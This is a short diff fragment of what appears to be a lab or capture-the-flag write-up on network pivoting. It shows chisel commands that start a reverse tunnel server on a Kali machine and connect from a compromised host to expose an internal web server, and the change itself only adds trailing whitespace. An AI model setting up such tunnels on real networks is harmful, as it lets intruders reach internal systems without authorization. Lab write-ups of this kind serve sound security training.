@@ -191,7 +191,7 @@ chisel server -p 5555 --reverse
 
 on our reverseshell machine1
 ```
-./chisel32 client 192.168.2.129:5555 R:1234:192.168.3.129:80
+./chisel32 client 192.168.2.129:5555 R:1234:192.168.3.129:80	 
 ```
 
 the above command connects to our kali and then 
